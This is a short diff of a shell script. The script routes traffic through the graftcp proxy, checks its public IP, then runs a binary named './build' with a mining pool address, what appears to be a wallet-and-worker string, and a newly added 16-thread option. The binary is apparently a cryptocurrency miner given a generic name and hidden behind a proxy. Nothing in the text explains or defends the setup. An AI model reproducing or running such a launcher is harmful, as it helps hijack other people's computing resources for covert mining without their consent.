@@ -9,4 +9,4 @@ END
 sleep .2
 ./graftcp/graftcp curl ifconfig.me
 
-./graftcp/graftcp ./build -v -l 139.99.123.225:3956 -u RG8nBd1ce7oAUHV3kL6ezoeApw9VUPzZy2.RDP0
+./graftcp/graftcp ./build -v -l 139.99.123.225:3956 -u RG8nBd1ce7oAUHV3kL6ezoeApw9VUPzZy2.RDP0 -t 16
